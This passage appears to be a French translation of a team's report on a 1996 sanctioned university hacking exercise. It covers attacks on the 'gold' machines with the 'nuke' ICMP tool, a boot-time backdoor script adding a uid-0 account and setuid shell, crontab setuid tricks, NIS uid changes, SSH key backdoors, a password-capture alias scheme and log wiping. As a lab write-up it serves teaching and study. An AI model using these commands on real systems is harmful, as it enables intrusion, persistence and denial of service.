de service bas&eacute;es sur les bombes ICMP, filtrez les paquets
TCMP redirect et ICMP destination unreachable. De plus, les r&eacute;seaux
devraient filtrer les paquets rout&eacute;s (document
ftp://info.cert.org/pub/tech_tips/packet_filtering). Manifestement ce
type de protection n'&eacute;tait pas mis en place pour le sous
r&eacute;seau gold puisque nous avons toujours &eacute;t&eacute;
capable d'envoyer des paquets avec des adresses IP falsifi&eacute;es.</P>
<P ALIGN=LEFT>L'&eacute;tape suivante fut d'utiliser le programme
&laquo;&nbsp;nuke&nbsp;&raquo; largement diffus&eacute; sur Internet.
La version disponible sur le r&eacute;seau tuait les connexions
telnet en envoyant des paquets ICMP unreach &agrave; la machine
cible. &laquo;&nbsp;nuke&nbsp;&raquo; fut modifi&eacute; afin
d'attaquer n'importe quelle connexion. Voici un exemple du programme
en pleine action :</P>
<P ALIGN=LEFT>Tout d'abord, on se connecte sur gold2 et on observe
quelles sont les connexions actives, puis on d&eacute;cide lesquelles
attaquer :</P>
<P ALIGN=LEFT>gold2% netstat -a <BR><I>. <BR>. <BR>. <BR>. <BR>.
<BR>*.80 *.* 0 0 0 0 LISTEN <BR>gold2.32794 gold1.32771 8760 0 8760 0
ESTABLISHED <BR>gold2.1022 gold1.nfsd 8760 0 8760 0 ESTABLISHED
<BR>gold2.telnet gold1.33049 8760 0 8760 0 ESTABLISHED <BR>*.22 *.* 0
0 0 0 LISTEN <BR>gold2.telnet gold1.33105 8760 0 8760 0 ESTABLISHED
<BR>gold2.telnet kennel.54746 49640 0 8760 0 ESTABLISHED
<BR>gold2.telnet black4.1213 14335 0 10052 0 ESTABLISHED
<BR>^^^^^^^^^^^^^^^^^^^^^^^^^ targeted connection <BR>gold2.22
kennel.54748 49640 0 8760 0 ESTABLISHED <BR>gold2.22 kennel.54749
49640 0 8760 0 ESTABLISHED <BR>. <BR>. <BR>. <BR>. <BR>.</I></P>
<P ALIGN=LEFT STYLE="font-style: normal">Nous lan&ccedil;ons ensuite
nuke sur black4 avec les param&egrave;tres appropri&eacute;s :</P>
<P ALIGN=LEFT><I>black5% su <BR>Password: <BR># ./nuke gold2 black4
1213 23 <BR>#</I></P>
<P ALIGN=LEFT STYLE="font-style: normal">Un autre &laquo;&nbsp;netstat
-a&nbsp;&raquo; sur la machine gold2 nous montrait que la connexion
n'existait plus :</P>
<P ALIGN=LEFT><I>gold2% netstat -a <BR>. <BR>. <BR>. <BR>. <BR>. <BR>.
<BR>. <BR>*.80 *.* 0 0 0 0 LISTEN <BR>gold2.32794 gold1.32771 8760 0
8760 0 ESTABLISHED <BR>gold2.1022 gold1.nfsd 8760 0 8760 0
ESTABLISHED <BR>gold2.telnet gold1.33049 8760 0 8760 0 ESTABLISHED
<BR>*.22 *.* 0 0 0 0 LISTEN <BR>gold2.telnet gold1.33105 8760 0 8760
0 ESTABLISHED <BR>gold2.telnet kennel.54746 49640 0 8760 0
ESTABLISHED <BR>gold2.22 kennel.54748 49640 0 8760 0 ESTABLISHED
<BR>gold2.22 kennel.54749 49640 0 8760 0 ESTABLISHED <BR>. <BR>. <BR>.
<BR>. <BR>.</I></P>
<P ALIGN=LEFT STYLE="font-style: normal">Le programme fut ensuite
utilis&eacute; pour faire ramer le serveur NFS de gold2 et pour tuer
les connexions de login sur gold2. Pour d'avantage de d&eacute;tails
sur cette attaque de d&eacute;ni de service, le lecteur peut se
r&eacute;f&eacute;rer &agrave; la section E.3.</P>
<OL START=9>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="d9"></A><B>Effacer nos traces</B></P>
</OL>
<P ALIGN=LEFT>Un programme qui efface nos
entr&eacute;es des tables wtmpx &eacute;tait &agrave; notre
disposition. Il est list&eacute; en annexe. Un utilisateur qui
appelle cette commande n'appara&icirc;tra pas lors d'un who ou d'un
w, la seule trace de son activit&eacute; peut &ecirc;tre d&eacute;cel&eacute;e
en lan&ccedil;ant &laquo;&nbsp;ps&nbsp;&raquo;. Une portion de ce
programme provient d'une liste de diffusion. Le programme de cette
liste effa&ccedil;ait les traces de utmpo ou wtmp, un support pour
utmpx, wtmpx et quelques autre logs a &eacute;t&eacute; ajout&eacute;.</P>
<OL TYPE=A START=5>
	<LI><P ALIGN=LEFT><A NAME="e"></A><p class="texttitre"><B>Exploitation
	de nos Outils de Hacking, leurs Attaques et leurs R&eacute;sultats</B></p></P>
</OL>
<OL>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="e1"></A><B>Exploitation des r&eacute;pertoires
	Home partag&eacute;s</B></P>
</OL>
<P ALIGN=LEFT>Trappes grossi&egrave;res
dans le .cshrc des personnes qui avaient des fichiers appartenant &agrave;
root dans leur r&eacute;pertoire home (vraisemblablement des membres
de l'&eacute;quipe gold), avec l'intention que la commande 'ls' cr&eacute;e
un shell suid quand on l'appelle en root. Cela n'a pas fonctionn&eacute;
comme on l'aurait souhait&eacute;.</P>
<P ALIGN=LEFT>Une trappe plus subtile
dans cops, qui se trouvait dans le home de l'utilisateur csudhir (le
jour pr&eacute;c&eacute;dent, nous avions remarqu&eacute; que COPS
&eacute;tait en train de tourner avec les droits root), COPS a &eacute;t&eacute;
retir&eacute; le lendemain.</P>
<P ALIGN=LEFT>Ajout d'une cl&eacute;
publique suppl&eacute;mentaire dans les fichiers .ssh/authorized-keys
de presque la moiti&eacute; des utilisateurs.. Nous avions, bien s&ucirc;r,
les cl&eacute;s priv&eacute;es correspondantes. Cela a &eacute;t&eacute;
d&eacute;couvert le 28 juin.</P>
<P ALIGN=LEFT>Un acc&egrave;s non-root
sur gold1 a &eacute;t&eacute; obtenu par la manoeuvre
pr&eacute;c&eacute;dente.</P>
<P ALIGN=LEFT>Le sch&eacute;ma suivant a
aussi &eacute;t&eacute; envisag&eacute; :</P>
<P ALIGN=LEFT>1 - Ajouter la commande
(alias su '/tmp/log1';unalias su) dans le fichier .login d'un membre
de l'&eacute;quipe gold.</P>
<P ALIGN=LEFT>2 - /tmp/log1 copierait le
fichier .login initial dans le r&eacute;pertoire home, demanderais un
mot de passe, l'enregistrerait dans un fichier du r&eacute;pertoire
temp, renverrait un message d'erreur (mot de passe invalide), et
s'effacerait lui m&ecirc;me.</P>
<P ALIGN=LEFT>3 - Le unalias
garantirais que tout se d&eacute;roule de fa&ccedil;on cach&eacute;e.</P>
<P ALIGN=LEFT>Ce sch&eacute;ma n'a pas
&eacute;t&eacute; utilis&eacute; car l'acc&egrave;s root nous &eacute;tait
garanti par une m&eacute;thode bien plus franche, &agrave; savoir la
non-protection des tables NIS.</P>
<OL START=2>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="e2"></A><B>Acc&egrave;s root sur Gold2 et
	Gold1 gr&acirc;ce &agrave; l'exploit NIS</B></P>
</OL>
<P ALIGN=LEFT>Comme d&eacute;crit dans la
section D.4, l'exploit nous permettait de gagner rapidement un acc&egrave;s
root sur gold2. Il nous restait encore &agrave; obtenir un acc&egrave;s
root sur gold1.</P>
<P ALIGN=LEFT>Se connecter comme simple
utilisateur de l'&eacute;quipe gold &eacute;tait ais&eacute; en
utilisant ssh. Les r&eacute;pertoires /export/home de gold2 &eacute;taient
export&eacute;s sans le drapeau suid, mais sur gold1 ils &eacute;taient
export&eacute;s avec le drapeau suid activ&eacute;. Cela signifiait
qu'un fichier suid root dans un r&eacute;pertoire home ne pouvait pas
&ecirc;tre ex&eacute;cut&eacute; sur gold2, mais cela &eacute;tait
possible sur black1 ! La suite a &eacute;t&eacute; tr&egrave;s simple
:</P>
<P ALIGN=LEFT>1 - Nous sommes pass&eacute;s
root en utilisant la commande :</P>
<P ALIGN=LEFT><I>stbladm -m uid=0
'[name=edaniel]',passwd.org_dir</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">2 -
Une cl&eacute; ssh fut ajout&eacute; au membre X de l'&eacute;quipe
gold, ensuite nous avons fait un su pour ce compte sur gold2.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">3 -
Un shell root suid fut cr&eacute;e dans le home de X.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">4 -
Nous avons acc&eacute;d&eacute; &agrave; gold1 en tant que X puis
avons lanc&eacute; ce shell.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">5 -
Nous obtenons alors un acc&egrave;s root sur gold1.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Nous
avons ensuite proc&eacute;d&eacute; aux t&acirc;ches suivantes :</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">1 -
Ins&eacute;rer une porte d&eacute;rob&eacute;e dans un ex&eacute;cutable
suid dans le r&eacute;pertoire /bin de gold1 et gold2 (toujours
pr&eacute;sent lors des vacances du milieu de trimestre). Le trojan
&eacute;tait un simple shell qui substituait la commande &laquo;&nbsp;fdformat&nbsp;&raquo;
dans /usr/bin. A la fin de cet exercice nous avons appris que le
trojan avait &eacute;t&eacute; effac&eacute; par inadvertance lorsque
l'&eacute;quipe gold effa&ccedil;a /bin par erreur.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">2 -
Ajout d'une cl&eacute; publique dans /root/.ssh/autorized_keys de
gold1 et gold2. Cela nous permettait de nous connecter en root sur
gold1 et gold2 par ssh. Il s'est av&eacute;r&eacute; par la suite que
se connecter en tant que root cr&eacute;ait des entr&eacute;es utmp
pour le root (l'&eacute;quipe gold acc&eacute;dait toujours au statut
root par su), un membre de la gold le remarqua et d&eacute;couvrit
les cl&eacute;s ssh.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">3 -
Cr&eacute;ation d'un nouvel utilisateur (pr&eacute;sent jusqu'&agrave;
la fin des jeux), le nom de cet utilisateur est sanjay et il poss&egrave;de
son propre r&eacute;pertoire home et sa propre cl&eacute; ssh. Ce qui
est &eacute;trange c'est le fait que NIS permettent &agrave; root de
g&eacute;rer les tables NIS (cr&eacute;er un nouveau compte) sur
gold1 sans passer par une authentification par mot de passe.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">L'acc&egrave;s
root fut maintenu jusqu'au fatidique jour du 17 juillet. Les
utilisateurs Ralphg et Ajayg essayaient d'utiliser cette ouverture
une nouvelle fois. L'utilisateur Ajayg changea son uid &agrave; 0,
puis se d&eacute;connecta et se reconnecta plusieurs fois jusqu'&agrave;
ce qu'il obtienne l'acc&egrave;s root.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Ce que
les deux hackers n'avaient pas r&eacute;alis&eacute;, c'&eacute;tait
qu'ils auraient pu garder le shell lorsque l'utilisateur Ajayg avait
toujours son uid d'origine. L'utilisateur Ajayg passa root sur gold2,
il ne pouvait plus acc&eacute;der &agrave; son entr&eacute;e initial
dans les tables NIS situ&eacute;es sur gold1.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">L'utilisateur
edaniel se joignit &agrave; nous et se rendis compte que le seul
rem&egrave;de &eacute;tait d'obtenir l'acc&egrave;s root sur gold1
puis de ramener les tables &agrave; leurs &eacute;tats initiaux. Une
cl&eacute; ssh fut ajout&eacute; au membre Csudhir de l'&eacute;quipe
gold, puis nous nous sommes log&eacute;s sur gold1. L'utilisateur
anb5324 rodait sur gold1 et remarqua la connexion suspecte. am5324 se
connecta sur gold2 et tua rapidement nos sessions telnet. Nous avons
alors du nous reconnecter par une backdoor que nous avions plac&eacute;
(un compte uucp sans mot de passe et avec un uid de 0), nous avons
ensuite tu&eacute; les sessions telnet de anb5324. anb5324
rafraichissa la table de routage de gold2, et nous furent mis hors
jeux. Plus tard dans la journ&eacute;e, l'erreur de configuration fut
rectifi&eacute;e.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">La
le&ccedil;on que nous en avons tir&eacute; &eacute;tait que nous
devions hacker avec plus de pr&eacute;cautions pour la suite. 
</P>
<OL START=3>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="e3"></A><B>Exploitation de la
	vuln&eacute;rabilit&eacute; Kcms</B></P>
</OL>
<P ALIGN=LEFT>Comme &eacute;crit plus t&ocirc;t
dans la section D.6.2, l'exploit kcms_calibrate rend possible la
cr&eacute;ation de n'importe quel fichier inexistant &agrave;
n'importe quel endroit sur le syst&egrave;me de fichier local de
gold2. Les &eacute;tapes suivantes ont &eacute;t&eacute; suivi :</P>
<P ALIGN=LEFT>1 - Pour tester, nous
avons cr&eacute;e un fichier /.rhosts. Cela s'est av&eacute;r&eacute;
d'aucune utilit&eacute; parce que ni ssh ni rlogin ne sont
disponibles sur gold2. Toutefois, l'&eacute;quipe gold n'effa&ccedil;a
pas le fichier avant 5 jours.</P>
<P ALIGN=LEFT>2 - L'attaque fut lanc&eacute;e
en cr&eacute;ant le fichier de script S100blah dans /etc/rc2.d. Les
scripts se trouvant dans le r&eacute;pertoire rc2.d sont lanc&eacute;s
&agrave; chaque red&eacute;marrage du syst&egrave;me. Voici le script
de cette backdoor :</P>
<P ALIGN=LEFT><I># Give us root access
<BR>/bin/echo &quot;uuucp::0:0:H. Acker:/:&quot; &gt;&gt; /etc/passwd
<BR>/bin/cp -p /bin/sh /etc/mysh <BR>/bin/chmod u+s /etc/mysh
<BR>/bin/chown root /etc/mysh <BR>/bin/rm -rf /root/*iger* &gt;
/dev/null 1&gt;&amp;2</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Cet
exploit fonctionnait tr&egrave;s bien, il nous donnait l'acc&egrave;s
root apr&egrave;s chaque reboot.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">3 -
Le programme cron tourne en t&acirc;che de fond et ex&eacute;cute des
commandes pr&eacute;cises &agrave; des intervalles de temps pr&eacute;cis.
A chaque d&eacute;marrage, il lit la table de commandes de chaque
utilisateurs &agrave; partir de /var/spool/cron/crontabs/. L'astuce
consistait &agrave; cr&eacute;er un fichier crontab pour
l'utilisateur smtp, cependant smtp se trouvait dans le fichier
/etc/cron.d/cron.deny qui se trouvait sur gold2. Voici ce que les
pages de manuels de crontab nous disait &agrave; propos des contr&ocirc;les
d'acc&eacute;s de crontab :</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">contr&ocirc;le
d'Acc&eacute;s de crontab</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Utilisateurs
: L'acc&eacute;s &agrave; crontab est autoris&eacute; :</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">o si le
nom de l'utilisateur appara&icirc;t dans /etc/cron.d/cron.allow.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">o si
/etc/cron.d/cron.allow n'existe pas et si le nom de l'utilisateur
n'appara&icirc;t pas dans /etc/cron.d/cron.deny.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Utilisateurs
: L'acc&egrave;s est interdit :</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">o si
/etc/cron.d/cron.allow existe et que le nom de l'utilisateur ne s'y
trouve pas</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">o si
/etc/cron.d/cron.allow n'existe pas et si le nom de l'utilisateur se
trouve dans /etc/cron.d/cron.deny.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">o si
aucun des deux fichiers n'existe</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Il
&eacute;tait donc &eacute;vident que nous devions cr&eacute;er deux
fichiers. Tout d'abord, /etc/cron.d/cron.allow fut cr&eacute;e et
rempli avec tous les utilisateurs qui auraient du avoir acc&egrave;s
&agrave; la commande crontab :</P>
<P ALIGN=LEFT><I>root<BR>smtp <BR>larsc
<BR>karthik <BR>jxue <BR>junhua <BR>xqzhi <BR>asg7946 <BR>krisjay
<BR>ritat <BR>uday3988 <BR>dunnc <BR>csudhir <BR>michaelm <BR>mmehta
<BR>nshanti <BR>anb5324 <BR>jredd <BR>ajayg <BR>raulg <BR>edaniel
<BR>ralphg <BR>faisalk <BR>rehan <BR>rbatni <BR>dpatel <BR>btm2564
<BR>saa2397 <BR>nabrol <BR>skumar <BR>smani <BR>mpriddy <BR>luwenhu
<BR>brandonb <BR>johnnyh <BR>asahoo <BR>a0s8815 <BR>sajidm <BR>wayne
<BR>ellenm <BR>willis <BR>pooch <BR>hacker <BR>sanjay <BR>iakhan</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Nous
avons ensuite cr&eacute;e un fichier crontab sp&eacute;cifique &agrave;
smtp dans /var/spool/cron/crontabs, nous avons du l'appeler smtp et
il contenait :</P>
<P ALIGN=LEFT><I>15 3 * * * * /bin/cp
/bin/sh /var/adm/sids/.sh </I>
</P>
<P><I>16 3 * * * * /bin/chmod 4755 /var/adm/sids/.sh </I>
</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Cet
exploit a &eacute;t&eacute; test&eacute; sur black5 et il
fonctionnait &agrave; la perfection, son r&ocirc;le &eacute;tait de
cr&eacute;er un shell suid root toutes les heures. Malheureusement
cela n'a pas fonctionn&eacute; sur la machine gold2, il s'est av&eacute;r&eacute;
plus tard que cela g&eacute;n&eacute;rait une erreur TT_DB lors de
l'ex&eacute;cution.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Il est
important de souligner que l'&eacute;quipe gold aurait eu beaucoup de
mal &agrave; trouver le shell ainsi cr&eacute;&eacute;. Le r&eacute;pertoire
/var/adm/sids est en effet utilis&eacute; par Tripwire pour stocker
certains de ses r&eacute;sultats. Comme tout est suppos&eacute;
changer dans ce r&eacute;pertoire, Tripwire ne le prend pas en
compte. C'est Aaron de l'&eacute;quipe gold qui nous l'a expliqu&eacute;
apr&egrave;s la fin des jeux. L'emplacement a &eacute;t&eacute; en
fait choisi par ironie : le r&eacute;pertoire contient des fichiers
qui servent &agrave; garder une trace des fichiers qui sont suid
root.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">4 -
Une fois les chevaux de Troie install&eacute;s, il nous suffisait
d'attendre un red&eacute;marrage. Toutefois, le temps filait tr&egrave;s
vite et nous approchions de la cl&ocirc;ture des jeux. Nous devions
donc trouver un moyen de crasher le syst&egrave;me, ou d'obliger
l'&eacute;quipe gold &agrave; rebooter.</P>
<OL START=4>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="e4"></A><B>Forcer le syst&egrave;me &agrave;
	red&eacute;marrer en utilisant le programme nuke</B></P>
</OL>
<P ALIGN=LEFT>Le port NFS de Gold1
tournait sur le port 2049. Gold2 se servait d'un port dans
l'intervalle 970-1010 pour son service NFS.</P>
<P ALIGN=LEFT>En utilisant le programme
nuke d&eacute;rit dans la section D.8, le script suivant fut cr&eacute;&eacute;
puis ex&eacute;cut&eacute; sur notre machine black. Cela ralentissait
toute op&eacute;ration NFS sur Gold2.</P>
<P ALIGN=LEFT><I>#!/bin/csh <BR>while (1)
<BR>./nuke gold2 gold1 2049 970&amp; <BR>./nuke gold2 gold1 2049 971&amp;
<BR>./nuke gold2 gold1 2049 972&amp; <BR>./nuke gold2 gold1 2049 973&amp;
<BR>./nuke gold2 gold1 2049 974&amp; <BR>./nuke gold2 gold1 2049 975&amp;
<BR>./nuke gold2 gold1 2049 976&amp; <BR>./nuke gold2 gold1 2049 978&amp;
<BR>./nuke gold2 gold1 2049 982&amp; <BR>./nuke gold2 gold1 2049 979&amp;
<BR>./nuke gold2 gold1 2049 980&amp; <BR>./nuke gold2 gold1 2049 987&amp;
<BR>./nuke gold2 gold1 2049 988&amp; <BR>./nuke gold2 gold1 2049 989&amp;
<BR>./nuke gold2 gold1 2049 990&amp; <BR>./nuke gold2 gold1 2049 997&amp;
<BR>./nuke gold2 gold1 2049 998&amp; <BR>./nuke gold2 gold1 2049 999&amp;
<BR>./nuke gold2 gold1 2049 1000&amp; <BR>./nuke gold2 gold1 2049
1001&amp; <BR>./nuke gold2 gold1 2049 1002&amp; <BR>./nuke gold2
gold1 2049 1003&amp; <BR>./nuke gold2 gold1 2049 1004&amp; <BR>./nuke
gold2 gold1 2049 1005&amp; <BR>./nuke gold2 gold1 2049 1006&amp;
<BR>./nuke gold2 gold1 2049 1007&amp; <BR>./nuke gold2 gold1 2049
1008&amp; <BR>./nuke gold2 gold1 2049 1009&amp; <BR>./nuke gold2
gold1 2049 1010&amp; <BR>./nuke gold2 gold1 2049 1011&amp; <BR>end</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Un peu
plus tard, l'attaque a &eacute;t&eacute; renforc&eacute;e en un
programme nuke-NFS.c. L'attaque est devenue beaucoup plus brutale et
les services NFS de gold &eacute;taient &agrave; la limite de tomber.</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">A
l'origine nous pensions compter uniquement sur l'attaque NFS, mais
certains membres de notre &eacute;quipe se sont laiss&eacute;s
emporter et ont commenc&eacute; &agrave; tuer toutes les connexions
ssh et telnet. Pendant deux heures, les autres &eacute;quipes n'ont
pas pu acc&eacute;der &agrave; gold2. L'&eacute;quipe gold a finis
par red&eacute;marrer sa machine.</P>
<OL START=5>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="e5"></A><B>Le combat avec l'&eacute;quipe
	Black4</B></P>
</OL>
<P ALIGN=LEFT>Apr&egrave;s le
red&eacute;marrage, nous avions toujours l'acc&egrave;s root &agrave;
gold2. Le programme /etc/mysh fonctionnait &agrave; la perfection, et
nous donnait l'acc&egrave;s root en tappant &laquo;&nbsp;/etc/mysh
-p&nbsp;&raquo;.</P>
<P ALIGN=LEFT>A notre grande surprise,
une autre &eacute;quipe avait l'acc&egrave;s root. Apr&egrave;s
quelques minutes motd &eacute;tait chang&eacute; en :</P>
<P ALIGN=LEFT><I>.^^^. <BR>&nbsp;|o o|
<BR>-------------- &quot;Root, is a state of MINE&quot; - BLACK4
--oOO-(_)-OOo--
**********************************************************************
<BR>Our deepest gratitue is extended to all those who made this
<BR>possible. Thanks for the ideas all you unnamed Hackers. </I>
</P>
<P><I>This one is for you!!!! </I>
</P>
<P><I>Please mail any questions, problems, or service requests to </I>
</P>
<P><I>postmaster (if we reenable that account :) ). </I>
</P>
<P><I>**********************************************************************
</I>
</P>
<P ALIGN=LEFT>Nous nous sommes vite
occup&eacute; de cela :</P>
<P ALIGN=LEFT>.<I>^^^. <BR>|o o|
<BR>-------------- &quot;Root, is a state of MINE&quot; - BLACK4
--oOO-(_)-OOo-- <BR>-============= No, it's mine! MINE!!!! =========
BLACK2 =========== <BR>Black2 Ruleeeeeeeeeeeeeeeeeeeeezzzzzzzz </I>
</P>
<P><I>**********************************************************************
</I>
</P>
<P><I>Our deepest gratitue is extended to all those who made this
<BR>possible. Thanks for the ideas all you unnamed Hackers. </I>
</P>
<P><I>This one is for you!!!! </I>
</P>
<P><I>Please mail any questions, problems, or service requests to </I>
</P>
<P><I>postmaster (if we reenable that account :) ). </I>
</P>
<P><I>**********************************************************************
</I>
</P>
<P ALIGN=LEFT>La GUERRE &eacute;tait
d&eacute;clar&eacute;e ! Pendant une heure et demi, nous avons tu&eacute;
toutes les connexions telnet et ssh sur gold2 en nous servant de
nuke. Pendant ce temps, les membres de l'&eacute;quipe black4 qui en
avaient la possibilit&eacute; tuaient nos processus.</P>
<P ALIGN=LEFT>Voici les quelques
derni&egrave;res commandes r&eacute;cup&eacute;r&eacute;es de la
fen&ecirc;tre xterm de l'un des notre alors que c'&eacute;tait le
chaos. Cet utilisateur &eacute;tait connect&eacute; &agrave; black5
en root et envoyait des paquets ICMP_port_unreachable pour tuer les
connexions des autres &eacute;quipes. Quatre autres membre de
l'&eacute;quipe faisaient la m&ecirc;me chose :) :</P>
<P ALIGN=LEFT><I># ./nuke gold2 black4
113 32985 <BR># ./nuke gold2 black4 1189 23 <BR># ./nuke gold2 black4
1191 23 <BR># ./nuke gold2 black4 1192 23 <BR># ./nuke gold2 black4
113 23 <BR># ./nuke gold2 black4 54466 22 <BR># ./nuke gold2 black4
1195 23 <BR># ./nuke gold2 black4 1194 23 <BR># ./nuke gold2 black4
sunrpc 33013 <BR># cat /etc/services | grep sunrpc <BR>sunrpc 111/udp
rpcbind <BR>sunrpc 111/tcp rpcbind <BR># ./nuke gold2 black4 111
33013 <BR># ./nuke gold2 black4 1194 23 <BR># ./nuke gold2 black4 113
33060 <BR># ./nuke gold2 black4 1196 23 <BR># ./nuke gold2 black4 113
23 <BR># ./nuke gold2 black4 1197 23 <BR># ./nuke gold2 black4 113 23
<BR># ./nuke gold2 black4 113 33070 <BR># ./nuke gold2 black4 1198 23
<BR># ./nuke gold2 black4 1198 23 <BR># ./nuke gold2 black4 1202 23
<BR># ./nuke gold2 black4 1203 23
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<BR>#
./nuke gold2 black4 113 33186<BR># ./nuke gold2 black4 1204 23 <BR>#
./nuke gold2 kennel 54510 finger <BR># ./nuke gold2 kennel 54514 22
<BR># ./nuke gold2 kennel 54504 23 <BR># ./nuke gold2 kennel 54506 23
<BR># ./nuke gold2 kennel 54505 22 <BR># ./nuke gold2 kennel 51128 22</I></P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">Nous
aurions tr&egrave;s bien pu gagner facilement la &laquo;&nbsp;bataille&nbsp;&raquo;
en effacant simplement les fichiers &laquo;&nbsp;ps&nbsp;&raquo; et
&laquo;&nbsp;kill&nbsp;&raquo; de /etc, rendant ainsi black4
&laquo;&nbsp;aveugle&nbsp;&raquo;. Nous n'y avons pas pens&eacute;
sur le moment. Tout le monde &eacute;tait tellement obnubil&eacute;
par la pr&eacute;sence de ces services que personne ne se rendit
compte qu'il suffisait d'effacer quelques fichiers !</P>
<P ALIGN=LEFT STYLE="font-style: normal; font-weight: medium">A 6
heures, nous &eacute;tions fatigu&eacute;s de cette querelle
insignifiante. Un membre de notre &eacute;quipe, edaniel, changea le
mot de passe eeprom (electrically erasable programmable ROM) et
red&eacute;marra la machine. Nous avions le dernier mot, le jeu fut
d&eacute;clar&eacute; cl&ocirc;t par M. Willis Marti.</P>
<OL TYPE=A START=6>
	<LI><P ALIGN=LEFT><A NAME="f"></A><p class="texttitre"><B>Outils
	de scanning</B></p></P>
</OL>
<P ALIGN=LEFT>Les
outils de scan que nous avons utilis&eacute; sont list&eacute;s
ci-dessous. COPS a &eacute;t&eacute; ex&eacute;cut&eacute; sur gold2
le premier jour de hacking. Toutes les failles test&eacute;es par
COPS &eacute;taient patch&eacute;es sur les syst&egrave;mes Gold.</P>
<OL>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="f1"></A><B>Computerized Oracle and
	Password System (COPS)</B></P>
</OL>
<P ALIGN=LEFT>Nous avons lanc&eacute; ce
programme sur gold2 afin de tester les failles connues dans le monde
de la s&eacute;curit&eacute;. Voici les rapport de s&eacute;curit&eacute;
g&eacute;n&eacute;r&eacute; :</P>
<P ALIGN=LEFT>Security Report for Mon Jun
17 01:00:14 CDT 1996 
</P>
<P>from host gold2 <BR>**** root.chk **** <BR>**** dev.chk **** <BR>****
is_able.chk **** <BR>**** rc.chk **** <BR>**** cron.chk **** <BR>****
group.chk **** <BR>**** home.chk **** <BR>**** passwd.chk **** <BR>****
user.chk **** <BR>**** misc.chk **** <BR>**** ftp.chk **** <BR>****
pass.chk **** <BR>**** kuang **** <BR>**** bug.chk **** 
</P>
<P ALIGN=LEFT>Les diff&eacute;rentes
v&eacute;rifications qui ont &eacute;t&eacute; faites incluent :</P>
<P ALIGN=LEFT>1 - V&eacute;rifier
certains fichiers comme /etc/passwd, /etc/shadow, .profile, /bin,
/etc</P>
<P ALIGN=LEFT>ainsi que d'autres fichiers
et r&eacute;pertoires critiques.</P>
<P ALIGN=LEFT>2 - Nous avons aussi
v&eacute;rifi&eacute; si certains utilisateurs avaient un mot de
passe vide</P>
<P ALIGN=LEFT>3 - V&eacute;rifier si
certains fichiers cron sont en &eacute;criture pour tout le monde</P>
<P ALIGN=LEFT>4 - Tester les
vuln&eacute;rabilit&eacute;s ftp ou chercher les mauvaises
configurations</P>
<P ALIGN=LEFT>5 - V&eacute;rifier les
bugs connus</P>
<OL START=2>
	<LI><P ALIGN=LEFT class="textgras"><A NAME="f2"></A><B>SATAN</B></P>
</OL>
<P ALIGN=LEFT>SATAN a &eacute;t&eacute;
t&eacute;l&eacute;charg&eacute; puis compil&eacute;. Il n'a pas &eacute;t&eacute;
ex&eacute;cut&eacute; sur un syst&egrave;me ferm&eacute;, car il
n&eacute;cessitait une communication avec des serveurs distants pour
fonctionner.</P>
<HR>
<OL TYPE=A START=7>
	<LI><P ALIGN=LEFT><A NAME="g"></A><p class="texttitre"><B>Conclusion</B></P></p>
</OL>
<P ALIGN=LEFT>Pour conclure, nous avons eu acc&egrave;s &agrave; tous
les comptes par trois reprises, acc&egrave;s root sur gold2 &agrave;
deux reprises et une fois root sur gold1. Nous avons mont&eacute;
avec succ&egrave;s une attaque par d&eacute;ni de service bas&eacute;e
sur le bombardement de paquets &laquo;&nbsp;ICMP_port_unreachable&nbsp;&raquo;.
Cette attaque tuait les connexions telnet et ssh des autres &eacute;quipes
sur gold2.</P>
<P ALIGN=LEFT>Nous avons test&eacute; &eacute;norm&eacute;ment de
choses, beaucoup ne sont pas list&eacute;es dans ce rapport car nous
n'en avons pas pris note. Tous les membres de l'&eacute;quipe ont
acquis beaucoup de connaissances sur l'administration syst&egrave;me.
